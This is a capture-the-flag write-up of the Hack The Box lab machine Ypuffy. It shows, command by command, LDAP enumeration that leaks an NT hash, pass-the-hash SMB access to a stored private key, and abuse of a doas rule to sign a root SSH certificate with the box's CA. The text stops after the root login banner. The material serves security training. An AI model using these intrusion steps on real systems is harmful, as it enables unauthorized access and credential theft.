# HTB: Ypuffy

[htb-ypuffy](/tags#htb-ypuffy ) [hackthebox](/tags#hackthebox )
[ctf](/tags#ctf ) [ldap](/tags#ldap ) [ssh](/tags#ssh ) [ssh-
keygen](/tags#ssh-keygen ) [doas](/tags#doas ) [sudo](/tags#sudo )
[certificate](/tags#certificate ) [certificate-authority](/tags#certificate-
authority ) [wireshark](/tags#wireshark )
[cve-2018-14665](/tags#cve-2018-14665 ) [python](/tags#python )
[flask](/tags#flask ) [wsgi](/tags#wsgi )
[authorizedkeyscommand](/tags#authorizedkeyscommand ) [htb-dab](/tags#htb-dab
)  
  
Feb 9, 2019

HTB: Ypuffy

![](https://0xdfimages.gitlab.io/img/ypuffy-cover.gif)Ypuffy was an OpenBSD
box, but the author said it could have really been any OS, and I get that. The
entire thing was about protocols that operate on any environment. I’ll use
ldap to get a hash, which I can use to authenticate an SMB share. There I find
an SSH key that gets me a user shell. From there, I’ll abuse my doas privilege
with ssh-keygen to create a signed certificate that I can use to authenticate
to the box as root for ssh. In Beyond root, I’ll look at the Xorg privesc
vulnerability that became public a month or so after Ypuffy was released, and
also explore the web server configuration used in the ssh auth.

## Box Info

Name | [Ypuffy](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fypuffy) [ ![Ypuffy](../img/box-ypuffy.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fypuffy)  
[Play on
HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fypuffy)  
---|---  
Release Date | [15 Sept 2018](https://twitter.com/hackthebox_eu/status/1039846363176026112)  
Retire Date | 8 Feb 2019  
OS | OpenBSD ![OpenBSD](../img/OpenBSD.png)  
Base Points | Medium [30]  
Rated Difficulty | ![Rated difficulty for Ypuffy](../img/ypuffy-diff.png)  
Radar Graph | ![Radar chart for Ypuffy](../img/ypuffy-radar.png)  
![First Blood User](../img/first-blood-user.png) | 00:35:46[![m0noc](https://www.hackthebox.com/badge/image/4365) m0noc](https://app.hackthebox.com/users/4365)  
  
![First Blood Root](../img/first-blood-root.png) | 02:37:53[![yuntao](https://www.hackthebox.com/badge/image/12438) yuntao](https://app.hackthebox.com/users/12438)  
  
Creator | [![AuxSarge](https://www.hackthebox.com/badge/image/46317) AuxSarge](https://app.hackthebox.com/users/46317)  
  
  
## Recon

### nmap

`nmap` gives me ssh, http, smb, and ldap.

    
    
    root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.107                                                                                                                                   [8/8]
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:05 EDT
    Nmap scan report for 10.10.10.107
    Host is up (0.019s latency).
    Not shown: 65530 closed ports
    PORT    STATE SERVICE
    22/tcp  open  ssh
    80/tcp  open  http
    139/tcp open  netbios-ssn
    389/tcp open  ldap
    445/tcp open  microsoft-ds
    
    Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
    
    root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.107
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:06 EDT
    Warning: 10.10.10.107 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.107
    Host is up (0.022s latency).
    All 65535 scanned ports on 10.10.10.107 are open|filtered (52336) or closed (13199)
    
    Nmap done: 1 IP address (1 host up) scanned in 131.87 seconds
    
    root@kali# nmap -sV -sC -oA nmap/scripts -p 22,80,139,389,445 10.10.10.107
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:09 EDT
    Nmap scan report for 10.10.10.107
    Host is up (0.019s latency).
    
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
    | ssh-hostkey:
    |   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
    |   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
    |_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
    80/tcp  open  http        OpenBSD httpd
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
    389/tcp open  ldap        (Anonymous bind OK)
    445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
    Service Info: Host: YPUFFY
    
    Host script results:
    |_clock-skew: mean: 1h16m59s, deviation: 2h18m34s, median: -3m01s
    | smb-os-discovery:
    |   OS: Windows 6.1 (Samba 4.7.6)
    |   Computer name: ypuffy
    |   NetBIOS computer name: YPUFFY\x00
    |   Domain name: hackthebox.htb
    |   FQDN: ypuffy.hackthebox.htb
    |_  System time: 2018-10-27T16:07:00-04:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2018-10-27 16:06:59
    |_  start_date: N/A
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds
    

Based on the scan and the httpd version, it looks like I have an OpenBSD

### HTTP - TCP 80

#### Site

Trying to access this site just returns nothing:

    
    
    root@kali# curl -v 10.10.10.107
    *   Trying 10.10.10.107...
    * TCP_NODELAY set
    * Connected to 10.10.10.107 (10.10.10.107) port 80 (#0)
    > GET / HTTP/1.1
    > Host: 10.10.10.107
    > User-Agent: curl/7.63.0
    > Accept: */*
    > 
    * Empty reply from server
    * Connection #0 to host 10.10.10.107 left intact
    curl: (52) Empty reply from server
    

Firefox shows the same thing:

![1549018095637](https://0xdfimages.gitlab.io/img/1549018095637.png)

#### Wireshark

I’ll fire up WireShark and reload the page. Firefox tries nine times to get
the page, and each time the pattern is exact the same:

![1549018736408](https://0xdfimages.gitlab.io/img/1549018736408.png)

My system and the server complete the TCP three way handshake to establish the
connection (green). Then I send the HTTP GET request (selected packet). Then
the server replies with a TCP `FIN, ACK`, which I reply to with a `FIN, ACK`,
and the server `ACK` to close the connection (red).

#### Server Version

`nmap` had reported this as `OpenBSD httpd`. How did it determine that if I’m
only getting `FIN, ACK` packets back? I ran my scan again with WireShark open:

    
    
    root@kali# nmap -sV -sC -p 80 10.10.10.107
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-01 05:36 EST
    Nmap scan report for 10.10.10.107
    Host is up (0.018s latency).
    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    OpenBSD httpd
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
    

There were 928 TCP streams, which is a lot to look through. So I started with
a search for the string “OpenBSD httpd”. It looks like when garbage data is
sent to the server, it does respond with a “400 Bad Request”. There are many
cases of that in this pcap, looking at any will show similar results:

![](https://0xdfimages.gitlab.io/img/ypuffy-wireshark.gif)

### LDAP - port 139

The initial `nmap` scan showed that this host allows anonymous ldap
connections. That means that the `nmap` ldap script will dump a lot of info
without any authentication (I’ll add some comments with `<--`):

    
    
    root@kali# nmap -p 389 --script *ldap* 10.10.10.107
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:14 EDT
    Nmap scan report for 10.10.10.107
    Host is up (0.019s latency).
    
    PORT    STATE SERVICE
    389/tcp open  ldap
    | ldap-rootdse:
    | LDAP Results
    |   <ROOT>
    |       supportedLDAPVersion: 3
    |       namingContexts: dc=hackthebox,dc=htb
    |       supportedExtension: 1.3.6.1.4.1.1466.20037
    |_      subschemaSubentry: cn=schema
    | ldap-search:
    |   Context: dc=hackthebox,dc=htb
    |     dn: dc=hackthebox,dc=htb
    |         dc: hackthebox
    |         objectClass: top
    |         objectClass: domain
    |     dn: ou=passwd,dc=hackthebox,dc=htb
    |         ou: passwd
    |         objectClass: top
    |         objectClass: organizationalUnit
    |     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
    |         uid: bob8791                      <-- userid
    |         cn: Bob
    |         objectClass: account
    |         objectClass: posixAccount
    |         objectClass: top
    |         userPassword: {BSDAUTH}bob8791    <-- password not given
    |         uidNumber: 5001
    |         gidNumber: 5001
    |         gecos: Bob
    |         homeDirectory: /home/bob8791
    |         loginShell: /bin/ksh
    |     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
    |         uid: alice1978                    <-- userid
    |         cn: Alice
    |         objectClass: account
    |         objectClass: posixAccount
    |         objectClass: top
    |         objectClass: sambaSamAccount
    |         userPassword: {BSDAUTH}alice1978  <-- password not given
    |         uidNumber: 5000
    |         gidNumber: 5000
    |         gecos: Alice
    |         homeDirectory: /home/alice1978
    |         loginShell: /bin/ksh
    |         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
    |         displayName: Alice
    |         sambaAcctFlags: [U          ]
    |         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
    |         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B   <- hash
    |         sambaPwdLastSet: 1532916644
    |     dn: ou=group,dc=hackthebox,dc=htb
    |         ou: group
    |         objectClass: top
    |         objectClass: organizationalUnit
    |     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
    |         objectClass: posixGroup
    |         objectClass: top
    |         cn: bob8791
    |         userPassword: {crypt}*
    |         gidNumber: 5001
    |     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
    |         objectClass: posixGroup
    |         objectClass: top
    |         cn: alice1978
    |         userPassword: {crypt}*
    |         gidNumber: 5000
    |     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
    |         sambaDomainName: YPUFFY
    |         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
    |         sambaAlgorithmicRidBase: 1000
    |         objectclass: sambaDomain
    |         sambaNextUserRid: 1000
    |         sambaMinPwdLength: 5
    |         sambaPwdHistoryLength: 0
    |         sambaLogonToChgPwd: 0
    |         sambaMaxPwdAge: -1
    |         sambaMinPwdAge: 0
    |         sambaLockoutDuration: 30
    |         sambaLockoutObservationWindow: 30
    |         sambaLockoutThreshold: 0
    |         sambaForceLogoff: -1
    |         sambaRefuseMachinePwdChange: 0
    |_        sambaNextRid: 1001
    
    Nmap done: 1 IP address (1 host up) scanned in 599.78 seconds
    

There’s a couple users in there, bob8791 and alice1978. The passwords are both
redacted, but alice1978 has an NT hash.

### SMB - Port 139 / 445

#### Enumerate Shares

If I enumerate shares without a password, I get nothing back from either
`smbmap` or `smbclient`:

    
    
    root@kali# smbmap -H 10.10.10.107
    [+] Finding open SMB ports....
    [+] Guest SMB session established on 10.10.10.107...
    [+] IP: 10.10.10.107:445	Name: 10.10.10.107                                      
    	Disk                                                  	Permissions
    	----                                                  	-----------
    [!] Access Denied
    
    root@kali# smbclient -N -L //10.10.10.107
    Anonymous login successful
    tree connect failed: NT_STATUS_ACCESS_DENIED
    

Fortunately, SMB allows pass the hash, and I now have a hash for alice1978. To
use a hash with `smbclient`, you just the same `-U username%password` format,
but just put the hash in place of the password, and add the `--pw-nt-hash`
option:

    
    
    root@kali# smbclient -L \\\\10.10.10.107 --pw-nt-hash -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B
    
            Sharename       Type      Comment
            ---------       ----      -------
            alice           Disk      Alice's Windows Directory
            IPC$            IPC       IPC Service (Samba Server)
    Reconnecting with SMB1 for workgroup listing.
    
            Server               Comment
            ---------            -------
    
            Workgroup            Master
            ---------            -------
    

I can do the same thing with `smbmap` just giving the hash as a password, but
it requires a hash in LM:NT format. I can just add the LM hash for the empty
string, aad3b435b51404eeaad3b435b51404ee.

    
    
    root@kali# smbmap -u alice1978 -p 'aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDCF6047784DE8B9FD8B' -H 10.10.10.107
    [+] Finding open SMB ports....
    [+] Hash detected, using pass-the-hash to authentiate
    [+] User session establishd on 10.10.10.107...
    [+] IP: 10.10.10.107:445	Name: 10.10.10.107                                      
    	Disk                                                  	Permissions
    	----                                                  	-----------
    	alice                                             	READ, WRITE
    	IPC$                                              	NO ACCESS
    

#### Connect and Collect

I’ll connect to the alice share and grab the only file there, a ppk file:

    
    
    root@kali# smbclient \\\\10.10.10.107\\alice -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash
    Try "help" to get a list of possible commands.
    smb: \> dir
      .                                   D        0  Mon Jul 30 22:54:20 2018
      ..                                  D        0  Tue Jul 31 23:16:50 2018
      my_private_key.ppk                  A     1460  Mon Jul 16 21:38:51 2018
    
                    433262 blocks of size 1024. 411540 blocks available
    smb: \> get my_private_key.ppk
    getting file \my_private_key.ppk of size 1460 as my_private_key.ppk (17.2 KiloBytes/sec) (average 17.2 KiloBytes/sec)
    smb: \> exit
    

## Shell As alice Via SSH

### Convert Key

The key I collected from SMB was a .ppk format. It has both the private and
public parts in one file:

    
    
    root@kali# cat my_private_key.ppk 
    PuTTY-User-Key-File-2: ssh-rsa
    Encryption: none
    Comment: rsa-key-20180716
    Public-Lines: 6
    AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz
    1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02qux
    BoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAj
    h7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/Sxa
    iA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWx
    ivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw==
    Private-Lines: 14
    AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwF
    VGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSE
    cOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsma
    hRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1q
    Gs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC
    3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6
    m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6
    l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v
    4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+
    qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPh
    hKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAA
    AIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5c
    QLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+Wuvl
    xTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
    Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9
    

However, to make use of this against an OpenBSD target (or Linux target), I’ll
need to convert it to OpenSSH format. To do that, I’ll use `puttygen`, which I
can install with `apt install putty-tools`. Then I’ll call `puttygen`, telling
it that the output should be a private openssh formatted key (`-O`) and
outputting the result to a file (`-o`) :

    
    
    root@kali# puttygen my_private_key.ppk -O private-openssh -o alice.pem
    
    root@kali# file alice.pem
    my_private_key: PEM RSA private key
    

### Shell as alice1978

Now I can connect as alice1978 using that key and get a shell, and user.txt:

    
    
    root@kali# ssh -i alice.pem alice1978@10.10.10.107
    OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
    
    Welcome to OpenBSD: The proactively secure Unix-like operating system.
    
    Please use the sendbug(1) utility to report bugs in the system.
    Before reporting a bug, please try to reproduce it with the latest
    version of the code.  With bug reports, please try to ensure that
    enough information to reproduce the problem is enclosed, and if a
    known fix for it exists, include that as well.
    
    ypuffy$ id
    uid=5000(alice1978) gid=5000(alice1978) groups=5000(alice1978)
    ypuffy$ ls  
    user.txt windir
    ypuffy$ cat user.txt
    acbc06eb...
    

## Privesc: alice1978 –> root

### SSH Enumeration

Right away I notice that there’s no `.ssh` directory in `/home/alice1978`.
Given that I just logged in with ssh keys, how is that possible?

    
    
    ypuffy$ pwd
    /home/alice1978
    ypuffy$ ls -la
    total 40
    drwxr-x---  3 alice1978  alice1978  512 Jul 31 23:16 .
    drwxr-xr-x  5 root       wheel      512 Jul 30 21:05 ..
    -rw-r--r--  1 alice1978  alice1978   87 Mar 24  2018 .Xdefaults
    -rw-r--r--  1 alice1978  alice1978  771 Mar 24  2018 .cshrc
    -rw-r--r--  1 alice1978  alice1978  101 Mar 24  2018 .cvsrc
    -rw-r--r--  1 alice1978  alice1978  359 Mar 24  2018 .login
    -rw-r--r--  1 alice1978  alice1978  175 Mar 24  2018 .mailrc
    -rw-r--r--  1 alice1978  alice1978  215 Mar 24  2018 .profile
    -r--------  1 alice1978  alice1978   33 Jul 30 22:40 user.txt
    drwxr-x---  2 alice1978  alice1978  512 Jul 30 22:54 windir
    

First place to check is `/etc/sshd/sshd_config` (I’ll use `grep` to first get
rid of lines that start with a comment, and then get rid of empty lines):

    
    
    ypuffy$ grep -vE "^#" sshd_config | grep .
    PermitRootLogin prohibit-password
    AuthorizedKeysFile      .ssh/authorized_keys
    AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
    AuthorizedKeysCommandUser nobody
    TrustedUserCAKeys /home/userca/ca.pub
    AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
    AuthorizedPrincipalsCommandUser nobody
    PasswordAuthentication no
    ChallengeResponseAuthentication no
    AllowAgentForwarding no
    AllowTcpForwarding no
    X11Forwarding no
    Subsystem       sftp    /usr/libexec/sftp-server
    

The first line allows for root login, just not with password. The bottom half
is disabling of password and challenge response auth, and agent forwarding. At
the top, there’s some interesting stuff about Authorized Keys and Authorized
Principles:

    
    
    AuthorizedKeysFile      .ssh/authorized_keys
    AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
    AuthorizedKeysCommandUser nobody
    
    TrustedUserCAKeys /home/userca/ca.pub
    AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
    AuthorizedPrincipalsCommandUser nobody
    

The public CA key is there along with likely the private one (that I can’t
read):

    
    
    ypuffy$ ls -l /home/userca/
    total 8
    -r--------  1 userca  userca  1679 Jul 30 21:08 ca
    -r--r--r--  1 userca  userca   410 Jul 30 21:08 ca.pub
    

### Background

Before I interact with this system, it’s worth taking a minute to look at what
this is trying to achieve. Key-based authentication for SSH is widely
considered both easier and more secure than password-based auth.

However, in a large enterprise, managing ssh keys gets to be quite a pain. If
IT wants to provision access to someone, they would have to go to each server
and update the authorized_keys file with a new key. And if someone leaves, do
it all over again. It just doesn’t scale.

SSH also allows authentication via signed certificates. You configure each
server to trust a certificate authority (CA) and any certificates that it
signs.

Facebook did a really great [post about how they are using signed certs for
SSH auth](https://code.fb.com/production-engineering/scalable-and-secure-
access-with-ssh/) that’s worth a read if you want to hear about it in action.

### Enumerating the CA

With the background in mind, I’ll see what I can get out of those two `curl`
commands in the `sshd_config` file.

#### Authorized Keys

First, I’ll take a look at the `AuthorizedKeysCommand`. Running it returns
alice’s public key:

    
    
    ypuffy$ /usr/local/bin/curl 'http://127.0.0.1/sshauth?type=keys&username=alice1978'       
    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
    

I can prove that by show it matches what was in the ppk:

    
    
    root@kali# puttygen my_private_key.ppk -O public-openssh
    ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716  
    

I could further enumerate this endpoint, but it seems to return public keys,
so even if I am able to find one for another user doesn’t get me very far.

#### Authorized Principles

The second `curl` was the `AuthorizedPrincipalsCommand`. The principal is a
link between the certificate and the accounts able to access it via
certificate.

If I query this endpoint for alice1978, I get back her name. Same thing with
the bob8971 account I found in ldap:

    
    
    ypuffy$ curl -s "http://127.0.0.1/sshauth?type=principals&username=alice1978"
    alice1978
    ypuffy$ curl -s "http://127.0.0.1/sshauth?type=principals&username=bob8791"
    bob8791
    

I’ll run over each of the users in `/etc/passwd` using a bash loop and see
what comes back:

    
    
    ypuffy$ for name in $(cut -d: -f1 /etc/passwd); do principal=$(curl -s "http://127.0.0.1/sshauth?type=principals&username=${name}"); if [[ ! -z $principal ]]; then echo "${name}: ${principal}"; fi; done 
    root: 3m3rgencyB4ckd00r
    

Here’s the breakdown of that loop:

  * `for name in $(cut -d: -f1 /etc/passwd); do` \- Get the lines from `/etc/passwd`, and cut on `:`, taking the first field, the name. Loop over these, using the `${name}` variable.
  * `principal=$(curl -s "http://127.0.0.1/sshauth?type=principals&username=${name}");` \- use `curl` to check the principal and store the result in `${principal}`.
  * `if [[ ! -z $principal ]]; then echo "${name}: ${principal}"; fi;` \- If `${principal}` is not an empty string, print the name and the principal.

Two things to note:

  * I got back something for root, which is definitely interesting, and it isn’t just the user name like the others were. I’ll use this in the next step.
  * I didn’t get back anything for alice1978 or bob8791. How is that possible? I showed their names did return stuff earlier. Because ssh is using this other method for auth, it doesn’t have to check against the `passwd` file.

### doas

On other piece of enumeration is necessary before I move into actually making
the jump to root. Whenever I try to escalate privileges on a Linux host, one
of the first things I check is `sudo -l`, to list what command I might be able
to run as root using `sudo`. FreeBSD has a similar construct, `doas`. I can
see what commands I can run with `doas` by reading `/etc/doas.conf`:

    
    
    ypuffy$ cat /etc/doas.conf
    permit keepenv :wheel
    permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
    

So I can run `ssh-keygen` as the userca user.

### Getting a Signed root SSH Certificate

By combining the my ability to run `ssh-keygen` as userca and my knowledge of
the root principal, I can generate a signed certificate that will let me SSH
into this host as root.

_August 2023 update: Years later, this step can have issues due to conflicts
between the SSH client on my local VM and the SSH server on Ypuffy, similar to
what’s
described[here](https://superuser.com/questions/1778874/openssh-v8-client-
talking-to-openssh-v6-7p1-server-no-mutual-signature-algorit). Following the
steps below exactly won’t work, though there are several small changes that
will work. One alternative is, after signing the SSH key, to SSH from from
Ypuffy rather than from my VM, thus using Ypuffy’s old SSH client (it saves
the `scp` step as well). Or I can use `-t ed22519` to generate a key. This
algorithm leads to different signing algorithms, which as of today can be used
by both my up to date client and Ypuffy. It’s worth noting though that that
could change in the future as well. Thanks to InvertedClimbing for identifying
this issue and the solution._

#### Generate a key-pair

First, I’ll generate a key-pair on my local box using `ssh-keygen`:

    
    
    root@kali# ssh-keygen -f id_rsa_ypuffy_root
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase): 
    Enter same passphrase again: 
    Your identification has been saved in id_rsa_ypuffy_root.
    Your public key has been saved in id_rsa_ypuffy_root.pub.
    The key fingerprint is:
    SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI root@kali
    The key's randomart image is:
    +---[RSA 2048]----+
    |         ....    |
    |          =. ... |
    |         o.o= ++ |
    |        ...+oo o=|
    |        S. .o+..=|
    |           +.=E++|
    |          . O=**o|
    |           o.O=o+|
    |              B=.|
    +----[SHA256]-----+
    
    root@kali# ls id_rsa_ypuffy_root*
    id_rsa_ypuffy_root  id_rsa_ypuffy_root.pub
    

#### scp Public Key to Ypuffy

Next, I need to move these to the CA host for signing. I’ll use scp using
alice’s public key to `/tmp`:

    
    
    root@kali# scp -i alice.pem id_rsa_ypuffy_root.pub alice1978@10.10.10.107:/tmp/
    id_rsa_ypuffy_root.pub                                                                                                                                                                    100%  391    20.3KB/s   00:00
    

#### Generate Signed Certificate

Now I’m going to generate the signed certificate using `ssh-keygen` running as
userca. First, I’ll need to make sure my public key can be read by userca:

    
    
    ypuffy$ chmod +r id_rsa_ypuffy_root.pub
    ypuffy$ ls -l id_rsa_ypuffy_root.pub
    -rwxr-xr--  1 alice1978  wheel  391 Feb  1 08:55 id_rsa_ypuffy_root.pub
    

Now, I’ll generate the cert:

    
    
    ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I 0xdf -n 3m3rgencyB4ckd00r -V +52w id_rsa_ypuffy_root.pub
    Signed user key id_rsa_ypuffy_root-cert.pub: id "0xdf" serial 0 for 3m3rgencyB4ckd00r valid from 2019-02-01T09:01:00 to 2020-01-31T09:02:19
    
    ypuffy$ ls -l id_rsa_ypuffy_root*
    -rw-r--r--  1 userca     wheel  1504 Feb  1 09:02 id_rsa_ypuffy_root-cert.pub
    -rwxr-xr--  1 alice1978  wheel   391 Feb  1 08:55 id_rsa_ypuffy_root.pub
    

Here’s the breakdown of the options I used with `ssh-keygen`:

  * `-s /home/userca/ca` \- Specifies that I want to sign a public key using the given CA private key.
  * `-I 0xdf` \- The identify associated with the certificate. In this case, it’s arbitrary. In an enterprise, they could use this to track who was assigned a given cert.
  * `-n 3m3rgencyB4ckd00r` \- The principles to be included in the certificate.
  * `-V +52w` \- Make this certificate good for 52 weeks.
  * `id_rsa_ypuffy_root.pub` \- the public key that will be associated with the certificate.

As the output shows, the command output a file ending in `-cert.pub`. The
original public key is unchanged.

#### scp Certificate

I can delete the public key here since I don’t need it anymore (I have a copy
on my host). I’ll need to get the certificate back. I could just copy/paste,
but I’ll use `scp`:

    
    
    root@kali# scp -i alice.pem alice1978@10.10.10.107:/tmp/id_rsa_ypuffy_root-cert.pub .
    id_rsa_ypuffy_root-cert.pub                             100% 1504    73.0KB/s   00:00
    

#### Examine Certificate / Keys

I can look at my certificate and keys using `ssh-keygen`. I’ll start by
getting the certificate information (`-L`) on the file:

    
    
    root@kali# ssh-keygen -L -f id_rsa_ypuffy_root-cert.pub 
    id_rsa_ypuffy_root-cert.pub:
            Type: ssh-rsa-cert-v01@openssh.com user certificate
            Public key: RSA-CERT SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI
            Signing CA: RSA SHA256:WCPFBuZqiubacS+hgAGylLHBjatuKa8zoWO2vFFycsg
            Key ID: "0xdf"
            Serial: 0
            Valid: from 2019-02-01T09:01:00 to 2020-01-31T09:02:19
            Principals: 
                    3m3rgencyB4ckd00r
            Critical Options: (none)
            Extensions: 
                    permit-X11-forwarding
                    permit-agent-forwarding
                    permit-port-forwarding
                    permit-pty
                    permit-user-rc
    

I can use `ssh-keygen` to check out the public key associated with my private
key and see that it matches, which is cool, since this private key didn’t go
to the server, but it is connected to this certificate:

    
    
    root@kali# ssh-keygen -l -f id_rsa_ypuffy_root
    2048 SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI root@kali (RSA)
    

### Logging In as root

Now I can `ssh` in as root. From the `ssh` man page:

>
>          -i identity_file
>                  Selects a file from which the identity (private key) for
> public
>                  key authentication is read.  The default is ~/.ssh/id_dsa,
>                  ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519 and ~/.ssh/id_rsa.
> Identity
>                  files may also be specified on a per-host basis in the
> configu‐
>                  ration file.  It is possible to have multiple -i options
> (and
>                  multiple identities specified in configuration files).  If
> no
>                  certificates have been explicitly specified by the
>                  CertificateFile directive, ssh will also try to load
> certifi‐
>                  cate information from the filename obtained by appending
>                  -cert.pub to identity filenames.
>  

So I’m need my certificate to match my private key plus `-cert.pub`, which it
does. With those two in the same directory, log in, specifying the private
key:

    
    
    root@kali# ls id_rsa_ypuffy_root*
    id_rsa_ypuffy_root  id_rsa_ypuffy_root-cert.pub
    
    root@kali# ssh -i id_rsa_ypuffy_root root@10.10.10.107
    OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
    
